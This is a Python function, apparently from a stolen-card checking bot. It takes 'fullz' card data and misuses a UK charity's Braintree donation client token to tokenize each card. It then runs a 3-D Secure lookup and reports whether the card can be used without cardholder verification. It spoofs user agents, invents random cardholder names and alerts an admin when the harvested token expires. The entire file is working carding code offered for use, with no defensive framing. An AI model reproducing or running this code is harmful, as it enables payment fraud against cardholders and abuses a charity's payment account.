async def vbvcheck(fullz , vbv_token , session):
    try:
        import random
        import base64
        import json
        import uuid 
        import string
        from fake_useragent import UserAgent
        from FUNC.defs import send_alert_to_admin
        First      = "".join(random.choice(string.ascii_lowercase) for i in range(6))
        Last       = "".join(random.choice(string.ascii_lowercase) for i in range(6))
        guid       = str(uuid.uuid4())
        user_agent = UserAgent().random

        cc  = fullz.split("|")[0]
        mes = fullz.split("|")[1]
        ano = fullz.split("|")[2]
        cvv = fullz.split("|")[3]

        url     = "https://charliewaller.org/umbraco/BraintreeDonation/BraintreeDonationSurface/ClientToken"
        headers = {
            "user-agent": user_agent,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded",
        }
        result       = await session.get(url = url , headers = headers)
        content      = json.loads(base64.b64decode(result.json()["clientToken"]).decode("utf-8"))
        bearer_token = content["authorizationFingerprint"]

        url     = "https://payments.braintree-api.com/graphql"
        headers = {
            "user-agent": user_agent,
            "content-type": "application/json",
            "authorization": "Bearer " + bearer_token,
            "braintree-Version": "2018-05-10",
            "host": "payments.braintree-api.com",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": guid,
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!){   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv,
                        "cardholderName": First + Last,
                    },
                    "options": {"validate": "false"},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        result = await session.post(url = url , json = payload , headers = headers)
        result = result.json()
        token  = result["data"]["tokenizeCreditCard"]["token"]
        bin    = result["data"]["tokenizeCreditCard"]["creditCard"]["bin"]

        url     = f"https://api.braintreegateway.com/merchants/zhqjdd67457jvj8k/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
        headers = {
            "user-agent": user_agent,
            "accept": "*/*",
            "accept-Language": "en-GB,en;q=0.9,en-US;q=0.8",
            "host": "api.braintreegateway.com",
            "origin": "https://charliewaller.org",
            "referer": "https://charliewaller.org/",
        }
        payload = {
            "amount": "1",
            "additionalInfo": {"acsWindowSize": "03"},
            "bin": bin,
            "dfReferenceId": vbv_token,
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.58.0",
                "cardinalDeviceDataCollectionTimeElapsed": 842,
                "issuerDeviceDataCollectionTimeElapsed": 602,
                "issuerDeviceDataCollectionResult": "true",
            },
            "authorizationFingerprint": bearer_token,
            "braintreeLibraryVersion": "braintree/web/3.58.0",
            "_meta": {
                "merchantAppId": "charliewaller.org",
                "platform": "web",
                "sdkVersion": "3.58.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": guid,
            },
        }
        result = await session.post(url = url , headers = headers , json = payload)
        try:
            status = result.json()["paymentMethod"]["threeDSecureInfo"]["status"]
        except:
            return "Unknown Error 🚫", result.text 

        if (
            "bypassed" in result.text
            or "authenticate_successful" in result.text
            or "authenticate_attempt_successful" in result.text
            or "authenticate_unavailable" in result.text
            or "lookup_not_enrolled" in result.text
            or "authentication_unavailable" in result.text
        ):
            return "VBV Passed ✅", status + " 🟢"

        elif "lookup_error" in result.text:
            await send_alert_to_admin("VBV_TOKEN")
            return "Dead 🔴", "Token Expired . Admin Has Been Notified 🚫"
        

        else:
            return "VBV Required ❌", status + " 🚫"
    except:
        return "Unknown Error 🔴", result.text + " 🚫"

